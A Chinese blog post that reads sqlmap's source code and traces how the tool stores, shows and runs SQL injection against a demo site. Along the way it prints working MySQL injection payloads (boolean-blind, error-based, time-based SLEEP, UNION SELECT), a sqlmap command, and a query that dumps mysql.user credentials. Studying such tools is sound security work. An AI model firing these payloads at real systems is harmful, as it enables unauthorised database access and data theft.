---
title: sqlmap 源码分析（四）开始注入
date: 2016-08-18 15:19:19
tags:
- python
- sqlmap
categories:
- Blogs
---



sqlmap是web狗永远也绕不过去的神器，为了能自由的使用sqlmap，阅读源码还是有必要的...

<!--more-->

# 开始注入 #

## 储存结果到文件 ##

在注入之前，我们先把注入payload储存到文件。(当然是在开启的情况下)

```
def _saveToResultsFile():
    if not conf.resultsFP:
        return

    results = {}
    techniques = dict(map(lambda x: (x[1], x[0]), getPublicTypeMembers(PAYLOAD.TECHNIQUE)))

    for injection in kb.injections + kb.falsePositives:
        if injection.place is None or injection.parameter is None:
            continue

        key = (injection.place, injection.parameter, ';'.join(injection.notes))
        if key not in results:
            results[key] = []

        results[key].extend(injection.data.keys())

    for key, value in results.items():
        place, parameter, notes = key
        line = "%s,%s,%s,%s,%s%s" % (safeCSValue(kb.originalUrls.get(conf.url) or conf.url), place, parameter, "".join(map(lambda x: techniques[x][0].upper(), sorted(value))), notes, os.linesep)
        conf.resultsFP.writelines(line)

    if not results:
        line = "%s,,,,%s" % (conf.url, os.linesep)
        conf.resultsFP.writelines(line)
```

这里的`kb.injections`就是我们的测试语句

```
[{'dbms': 'MySQL', 'suffix': " AND '[RANDSTR]'='[RANDSTR]", 'clause': [1, 9], 'notes': [], 'ptype': 2, 'dbms_version': ['>= 5.5'], 'prefix': "'", 'place': 'POST', 'data': {1: {'comment': '', 'matchRatio': 0.744, 'title': 'AND boolean-based blind - WHERE or HAVING clause', 'templatePayload': None, 'vector': 'AND [INFERENCE]', 'where': 1, 'payload': u"user=user1' AND 9674=9674 AND 'ilwI'='ilwI"}, 2: {'comment': '', 'matchRatio': 0.744, 'title': 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)', 'templatePayload': None, 'vector': "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", 'where': 1, 'payload': u"user=user1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171717671,(SELECT (ELT(9141=9141,1))),0x716a787871,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'Lpdv'='Lpdv"}, 5: {'comment': '', 'matchRatio': 0.744, 'title': 'MySQL >= 5.0.12 AND time-based blind', 'templatePayload': None, 'vector': 'AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'where': 1, 'payload': u"user=user1' AND SLEEP([SLEEPTIME]) AND 'YMTj'='YMTj"}, 6: {'comment': '[GENERIC_SQL_COMMENT]', 'matchRatio': 0.744, 'title': 'Generic UNION query (NULL) - 1 to 20 columns', 'templatePayload': None, 'vector': (1, 2, '[GENERIC_SQL_COMMENT]', "'", " AND '[RANDSTR]'='[RANDSTR]", 'NULL', 1, False, False), 'where': 1, 'payload': u"user=user1' UNION ALL SELECT NULL,CONCAT(0x7171717671,0x455455665759535741516e444c6878675142594d565477695058624c7670534f71706b5954574f5a,0x716a787871)-- oVjT"}}, 'conf': {'code': None, 'string': u'user1', 'notString': None, 'titles': None, 'regexp': None, 'textOnly': None, 'optimize': None}, 'parameter': u'user', 'os': None}]
```

## 储存到数据库 ##

同样的，如果开启了储存到数据库选项，会预先把payload储存到数据库

```
def _saveToHashDB():
    injections = hashDBRetrieve(HASHDB_KEYS.KB_INJECTIONS, True)
    if not isListLike(injections):
        injections = []
    injections.extend(_ for _ in kb.injections if _ and _.place is not None and _.parameter is not None)

    _ = dict()
    for injection in injections:
        key = (injection.place, injection.parameter, injection.ptype)
        if key not in _:
            _[key] = injection
        else:
            _[key].data.update(injection.data)
    hashDBWrite(HASHDB_KEYS.KB_INJECTIONS, _.values(), True)

    _ = hashDBRetrieve(HASHDB_KEYS.KB_ABS_FILE_PATHS, True)
    hashDBWrite(HASHDB_KEYS.KB_ABS_FILE_PATHS, kb.absFilePaths | (_ if isinstance(_, set) else set()), True)

    if not hashDBRetrieve(HASHDB_KEYS.KB_CHARS):
        hashDBWrite(HASHDB_KEYS.KB_CHARS, kb.chars, True)

    if not hashDBRetrieve(HASHDB_KEYS.KB_DYNAMIC_MARKINGS):
        hashDBWrite(HASHDB_KEYS.KB_DYNAMIC_MARKINGS, kb.dynamicMarkings, True)
```

## 展示注入payload ##

除了向文件输出以外，还要把payload输出到命令行

先做目标数量的判断
```
if kb.testQueryCount > 0:
    header = "sqlmap identified the following injection point(s) with "
    header += "a total of %d HTTP(s) requests" % kb.testQueryCount
else:
    header = "sqlmap resumed the following injection point(s) from stored session"
```

然后展示语句

```
 if hasattr(conf, "api"):
    conf.dumper.string("", kb.injections, content_type=CONTENT_TYPE.TECHNIQUES)
else:
    data = "".join(set(map(lambda x: _formatInjection(x), kb.injections))).rstrip("\n")
    conf.dumper.string(header, data)
```

这里对应命令行是这样的
```
sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=user1' AND 4676=4676 AND 'ZzOn'='ZzOn

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: user=user1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b786b71,(SELECT (ELT(7994=7994,1))),0x717a787871,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'XSuv'='XSuv

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=user1' AND SLEEP(5) AND 'EJXX'='EJXX

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: user=user1' UNION ALL SELECT CONCAT(0x716b786b71,0x6a6a6668724d514d5448686874774f486d634550735659727866554e65554e4e4f55504146706471,0x717a787871),NULL-- QvWZ
```

## 根据位置进行注入 ##

`_selectInjection()`

### 循环解包出目标 ###

```
for injection in kb.injections:
    place = injection.place
    parameter = injection.parameter
    ptype = injection.ptype

    point = (place, parameter, ptype)

    if point not in points:
        points[point] = injection
    else:
        for key in points[point].keys():
            if key != 'data':
                points[point][key] = points[point][key] or injection[key]
        points[point]['data'].update(injection['data'])

```

这里举个例子

```
python sqlmap.py -u http://demo.lorexxar.pw/post.php?id=2 --data user=user1 --dbs
```

其中place为`POST`
parameter为`user`
ptype为`2`（应该是注入列数）

而injection就是相应的注入语句

### 对于多目标和单目标有不同的逻辑  ###

```
if len(points) == 1:
    kb.injection = kb.injections[0]

elif len(points) > 1:
    message = "there were multiple injection points, please select "
    message += "the one to use for following injections:\n"

    points = []

    for i in xrange(0, len(kb.injections)):
        place = kb.injections[i].place
        parameter = kb.injections[i].parameter
        ptype = kb.injections[i].ptype
        point = (place, parameter, ptype)

        if point not in points:
            points.append(point)
            ptype = PAYLOAD.PARAMETER[ptype] if isinstance(ptype, int) else ptype

            message += "[%d] place: %s, parameter: " % (i, place)
            message += "%s, type: %s" % (parameter, ptype)

            if i == 0:
                message += " (default)"

            message += "\n"

    message += "[q] Quit"
    select = readInput(message, default="0")

    if select.isdigit() and int(select) < len(kb.injections) and int(select) >= 0:
        index = int(select)
    elif select[0] in ("Q", "q"):
        raise SqlmapUserQuitException
    else:
        errMsg = "invalid choice"
        raise SqlmapValueException(errMsg)

    kb.injection = kb.injections[index]
```

### 进入注入 ###

确认目标后，进入注入,这里`action()`就是注入逻辑

```
if kb.injection.place is not None and kb.injection.parameter is not None:
    if conf.multipleTargets:
        message = "do you want to exploit this SQL injection? [Y/n] "
        exploit = readInput(message, default="Y")

        condition = not exploit or exploit[0] in ("y", "Y")
    else:
        condition = True

    if condition:
        action()
```

# 注入逻辑 #

## 获取数据库版本以及php版本 ##

`conf.dumper.singleString(conf.dbmsHandler.getFingerprint())`

追溯源码到了getFingerprint()函数

```
def getFingerprint(self):
    value = ""
    wsOsFp = Format.getOs("web server", kb.headersFp)

    if wsOsFp and not hasattr(conf, "api"):
        value += "%s\n" % wsOsFp

    if kb.data.banner:
        dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

        if dbmsOsFp and not hasattr(conf, "api"):
            value += "%s\n" % dbmsOsFp

    value += "back-end DBMS: "
    actVer = Format.getDbms()

    _ = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)
    if _:
        actVer += " (%s fork)" % _

    if not conf.extensiveFp:
        value += actVer
        return value

    comVer = self._commentCheck()
    blank = " " * 15
    value += "active fingerprint: %s" % actVer

    if comVer:
        comVer = Format.getDbms([comVer])
        value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

    if kb.bannerFp:
        banVer = kb.bannerFp["dbmsVersion"] if "dbmsVersion" in kb.bannerFp else None

        if banVer and re.search("-log$", kb.data.banner):
            banVer += ", logging enabled"

        banVer = Format.getDbms([banVer] if banVer else None)
        value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

    htmlErrorFp = Format.getErrorParsedDBMSes()

    if htmlErrorFp:
        value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

    return value
```

### 返回os ###

```
wsOsFp = Format.getOs("web server", kb.headersFp)

if wsOsFp and not hasattr(conf, "api"):
    value += "%s\n" % wsOsFp

if kb.data.banner:
    dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

    if dbmsOsFp and not hasattr(conf, "api"):
        value += "%s\n" % dbmsOsFp
```

### 返回数据库版本 ###

```
value += "back-end DBMS: "
actVer = Format.getDbms()

_ = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)
if _:
    actVer += " (%s fork)" % _

if not conf.extensiveFp:
    value += actVer
    return value
```

跟着Format.getDbms()

```
 def getDbms(versions=None):
	"""
	Format the back-end DBMS fingerprint value and return its
	values formatted as a human readable string.
	
	@return: detected back-end DBMS based upon fingerprint techniques.
	@rtype: C{str}
	"""
	
	if versions is None and Backend.getVersionList():
	    versions = Backend.getVersionList()
	
	return Backend.getDbms() if versions is None else "%s %s" % (Backend.getDbms(), " and ".join(filter(None, versions)))
```

然后追到Backend.getDbms()
```
def getDbms():
    return aliasToDbmsEnum(kb.get("dbms"))
```

这里只是改了个名

## 注入当前用户名 ##

然后根据选项开始注入逻辑，首先是当前用户
```
if conf.getCurrentUser:
    conf.dumper.currentUser(conf.dbmsHandler.getCurrentUser())
```

拼接查询目标
```
query = queries[Backend.getIdentifiedDbms()].current_user.query
```

这里的query返回了
```
CURRENT_USER()
```

然后开始注入逻辑
```
if not kb.data.currentUser:
    kb.data.currentUser = unArrayizeValue(inject.getValue(query))
```

追到inject里的
```
def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):

```

传入目标expression为`CURRENT_USER()`

获取注入有关数据
```
if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
    kb.technique = PAYLOAD.TECHNIQUE.UNION
    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]
    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion

```

其中kb.injection.data[PAYLOAD.TECHNIQUE.UNION]是
```
{'comment': '[GENERIC_SQL_COMMENT]', 'matchRatio': 0.744, 'title': 'Generic UNION query (NULL) - 1 to 20 columns', 'templatePayload': None, 'vector': (1, 2, '[GENERIC_SQL_COMMENT]', "'", " AND '[RANDSTR]'='[RANDSTR]", 'NULL', 1, False, False), 'where': 1, 'payload': u"user=user1' UNION ALL SELECT NULL,CONCAT(0x71626a7071,0x516c4d6874435a474655795351577850577a466c6b6f59494a534d574d6273524a45415776514f5a,0x7171787a71)-- HIuA"}
```

发起注入请求
```
try:
    value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
except SqlmapConnectionException:
    if not fallback:
        raise
```

这里的value已经获取到了返回
`hctfsqli1@localhost`

追溯函数，传入的的参数:
```
query = CURRENT_USER()
unpack = True
dump = False
```

_goUnion()为
```
def _goUnion(expression, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an union SQL
    injection vulnerability on the affected parameter.
    """

    output = unionUse(expression, unpack=unpack, dump=dump)

    if isinstance(output, basestring):
        output = parseUnionPage(output)

    return output
```

追溯到unionUse()

首先是初始化
```
initTechnique(PAYLOAD.TECHNIQUE.UNION)

    abortedFlag = False
    count = None
    origExpr = expression
    startLimit = 0
    stopLimit = None
    value = None

    width = getConsoleWidth()
    start = time.time()

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)
```

由于注入当前用户名可能不需要太复杂的处理，所以直接跳过中间的大段处理

```
if not value and not abortedFlag:
    output = _oneShotUnionUse(expression, unpack)
    value = parseUnionPage(output
```

output为`qbjpqhctfsqli1@localhostqqxzq`
传入expression为`CURRENT_USER()`

进入_oneShotUnionUse()，首先是从session读取数据
```
retVal = hashDBRetrieve("%s%s" % (conf.hexConvert or False, expression), checkConf=True)  # as UNION data is stored raw unconverted
    
```

如果没有，则继续，拼接payload是最重要的

```
if not kb.rowXmlMode:
    injExpression = unescaper.escape(agent.concatQuery(expression, unpack))
    kb.unionDuplicates = vector[7]
    kb.forcePartialUnion = vector[8]
    query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
    where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]
else:
    where = vector[6]
    query = agent.forgeUnionQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, False)

payload = agent.payload(newValue=query, where=where)
```
这里的payload为
```
user=__PAYLOAD_DELIMITER__user1' UNION ALL SELECT NULL,CONCAT(0x7176626271,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x717a766271)-- SnOp__PAYLOAD_DELIMITER__
```

传入newValue为
```
' UNION ALL SELECT CONCAT(0x7170626b71,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x716a7a7a71),NULL[GENERIC_SQL_COMMENT]
```

让我们先来看看newValue是怎么拼接出来的，`agent.concatQuery`是用来拼接处CONCAT语句的

拼接
```
if unpack:
    concatenatedQuery = ""
    query = query.replace(", ", ',')
    fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)
    castedFields = self.nullCastConcatFields(fieldsToCastStr)
    concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
else:
    return query
```

这里concatenatedQuery
```
IFNULL(CAST(CURRENT_USER() AS CHAR),' ')
```

针对不同数据库的改变

```
if Backend.isDbms(DBMS.MYSQL):
    if fieldsExists:
        concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
        concatenatedQuery += ",'%s')" % kb.chars.stop
    elif fieldsSelectCase:
        concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
        concatenatedQuery += ",'%s')" % kb.chars.stop
    elif fieldsSelectFrom:
        _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
        concatenatedQuery = "%s,'%s')%s" % (concatenatedQuery[:_].replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])
    elif fieldsSelect:
        concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
        concatenatedQuery += ",'%s')" % kb.chars.stop
    elif fieldsNoSelect:
        concatenatedQuery = "CONCAT('%s',%s,'%s')" % (kb.chars.start, concatenatedQuery, kb.chars.stop)
```

返回
```
CONCAT('qqbjq',IFNULL(CAST(CURRENT_USER() AS CHAR),' '),'qqpvq')
```

然后forgeUnionQuery来拼接
```
query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)

```

这个函数的作用是
```
MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user

MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

```

和上面的逻辑大同小异，就不贴代码了

拼接好payload就要请求了
```
page, headers = Request.queryPage(payload, content=True, raise404=False)

```

这里的返回时
```
<table><tr><th>id</th><th>name</th></tr><tr><td>1</td><td>user1</td></tr><tr><td></td><td>qzxjqhctfsqli1@localhostqbbqq</td></tr></table> Server: nginx
Date: Fri, 19 Aug 2016 05:46:39 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.0.0
Content-Encoding: gzip
URI: http://demo.lorexxar.pw:80/post.php?id=2
```

解包出结果
```
if not kb.rowXmlMode:
    # Parse the returned page to get the exact UNION-based
    # SQL injection output
    def _(regex):
        return reduce(lambda x, y: x if x is not None else y, (\
                extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
                extractRegexResult(regex, removeReflectiveValues(listToStrValue(headers.headers \
                if headers else None), payload, True), re.DOTALL | re.IGNORECASE)), \
                None)

    # Automatically patching last char trimming cases
    if kb.chars.stop not in (page or "") and kb.chars.stop[:-1] in (page or ""):
        warnMsg = "automatically patching output having last char trimmed"
        singleTimeWarnMessage(warnMsg)
        page = page.replace(kb.chars.stop[:-1], kb.chars.stop)

	retVal = _("(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop))

```

这里获取到的retVal就是返回值，而传入的(?P<result>%s.*%s)则是填补padding

```
(?P<result>qjpvq.*qpbjq)
```

然后返回到最初，输出`current user:    'hctfsqli1@localhost'`


## 注数据库名字 ##

由于注入有很多选项，这里就只以数据库名字作为例子
```
if conf.getDbs:
        conf.dumper.dbs(conf.dbmsHandler.getDbs())
```

首先是判断information.schema能不能被注
```
if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
    warnMsg = "information_schema not available, "
    warnMsg += "back-end DBMS is MySQL < 5. database "
    warnMsg += "names will be fetched from 'mysql' database"
    logger.warn(warnMsg)

elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2, DBMS.PGSQL):
    warnMsg = "schema names are going to be used on %s " % Backend.getIdentifiedDbms()
    warnMsg += "for enumeration as the counterpart to database "
    warnMsg += "names on other DBMSes"
    logger.warn(warnMsg)

    infoMsg = "fetching database (schema) names"

else:
    infoMsg = "fetching database names"
```

发起注入，由于阅读源码更重要在于分析代码逻辑，所以这次使用bool型盲注来注入数据，

```
if not kb.data.cachedDbs and isInferenceAvailable() and not conf.direct:
    infoMsg = "fetching number of databases"
    logger.info(infoMsg)

    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
        query = rootQuery.blind.count2
    else:
        query = rootQuery.blind.count
    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

    if not isNumPosStrValue(count):
        errMsg = "unable to retrieve the number of databases"
        logger.error(errMsg)
    else:
        plusOne = Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2)
        indexRange = getLimitRange(count, plusOne=plusOne)

        for index in indexRange:
            if Backend.isDbms(DBMS.SYBASE):
                query = rootQuery.blind.query % (kb.data.cachedDbs[-1] if kb.data.cachedDbs else " ")
            elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                query = rootQuery.blind.query2 % index
            else:
                query = rootQuery.blind.query % index
            db = unArrayizeValue(inject.getValue(query, union=False, error=False))

            if db:
                kb.data.cachedDbs.append(safeSQLIdentificatorNaming(db))
```

这里首先是注入数据数量，query为基础payload
```
SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA
```

进入注入逻辑
```
 if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
    kb.technique = PAYLOAD.TECHNIQUE.BOOLEAN  

    if expected == EXPECTED.BOOL:
        value = _goBooleanProxy(booleanExpression)
    else:
        value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)

    count += 1
    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE
```

核心请求为
```
value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
```

而对应的参数是
```
SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA False False True 2 None None False
```

二分法实现注入逻辑

```
elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith("SELECT ") and " FROM " not in expression.upper():
        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)

```

这里的 expression, expressionFields, expressionFieldsList, payload分别是

```
SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA 
COUNT(DISTINCT(schema_name)) 
['COUNT(DISTINCT(schema_name))'] 
user=__PAYLOAD_DELIMITER__user1' AND ORD(MID((%s),%d,1))>%d AND 'fQbM'='fQbM__PAYLOAD_DELIMITER__
```

追过去，发现做了基本的处理
```
def _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs
```

里面payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field分别为
```
user=__PAYLOAD_DELIMITER__user1' AND ORD(MID((%s),%d,1))>%d AND 'yejJ'='yejJ__PAYLOAD_DELIMITER__ 
SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA 
2
None 
None 
False 
COUNT(DISTINCT(schema_name))
```

追溯到注入逻辑
```
def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
```

多线程的判断
```
if numThreads > 1:
    if not timeBasedCompare or conf.forceThreads:
        debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
        logger.debug(debugMsg)
    else:
        numThreads = 1

if conf.threads == 1 and not timeBasedCompare and not conf.predictOutput:
    warnMsg = "running in a single-thread mode. Please consider "
    warnMsg += "usage of option '--threads' for faster data retrieval"
    singleTimeWarnMessage(warnMsg)
```

当然这里是单线程的

```
while True:
    index += 1
    charStart = time.time()

    # Common prediction feature (a.k.a. "good samaritan")
    # NOTE: to be used only when multi-threading is not set for
    # the moment
    if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
        val = None
        commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

        # If there is one single output in common-outputs, check
        # it via equal against the query output
        if commonValue is not None:
            # One-shot query containing equals commonValue
            testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

            query = kb.injection.data[kb.technique].vector
            query = agent.prefixQuery(query.replace("[INFERENCE]", "(%s)=%s" % (expressionUnescaped, testValue)))
            query = agent.suffixQuery(query)

            result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
            incrementCounter(kb.technique)

            # Did we have luck?
            if result:
                if showEta:
                    progress.progress(time.time() - charStart, len(commonValue))
                elif conf.verbose in (1, 2) or hasattr(conf, "api"):
                    dataToStdout(filterControlChars(commonValue[index - 1:]))

                finalValue = commonValue
                break

        # If there is a common pattern starting with partialValue,
        # check it via equal against the substring-query output
        if commonPattern is not None:
            # Substring-query containing equals commonPattern
            subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
            testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

            query = kb.injection.data[kb.technique].vector
            query = agent.prefixQuery(query.replace("[INFERENCE]", "(%s)=%s" % (subquery, testValue)))
            query = agent.suffixQuery(query)

            result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
            incrementCounter(kb.technique)

            # Did we have luck?
            if result:
                val = commonPattern[index - 1:]
                index += len(val) - 1

        # Otherwise if there is no commonValue (single match from
        # txt/common-outputs.txt) and no commonPattern
        # (common pattern) use the returned common charset only
        # to retrieve the query output
        if not val and commonCharset:
            val = getChar(index, commonCharset, False)

        # If we had no luck with commonValue and common charset,
        # use the returned other charset
        if not val:
            val = getChar(index, otherCharset, otherCharset == asciiTbl)
    else:
        val = getChar(index, asciiTbl)
```

这里的val就是每次注入的一个字符，这里比较重要的就是val = getChar(index, asciiTbl)，这里index为第几位，asciiTbl则为可能的ascii表

对于数字和字符有不同的ascii表
```
数字
[0, 1, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57]

字母
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127]
```

二分法，首先定义最大最小字符
```
maxChar = maxValue = charTbl[-1]
minChar = minValue = charTbl[0]
```

进入循环，构造payload，每次取中间的那一位len(charTbl) >> 1
```
tion = (len(charTbl) >> 1)
    posValue = charTbl[position]
    falsePayload = None

    if "'%s'" % CHAR_INFERENCE_MARK not in payload:
        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
    else:
        # e.g.: ... > '%c' -> ... > ORD(..)
        markingValue = "'%s'" % CHAR_INFERENCE_MARK
        unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)
        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)
```

二分法需要两个payload，然后发起请求
```
result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
incrementCounter(kb.technique)
```

如果result是ture，那么当前值设置为最小值，前面所有值去掉，false同理
```
if result:
    minValue = posValue

    if type(charTbl) != xrange:
        charTbl = charTbl[position:]
    else:
        # xrange() - extended virtual charset used for memory/space optimization
        charTbl = xrange(charTbl[position], charTbl[-1] + 1)
else:
    maxValue = posValue

    if type(charTbl) != xrange:
        charTbl = charTbl[:position]
    else:
        charTbl = xrange(charTbl[0], charTbl[position])
```

这样最多7次，就可以确定其中一位了

时间盲注逻辑相同...

由于python水平还是有限，这次读源码就到这里了，有机会在深入读吧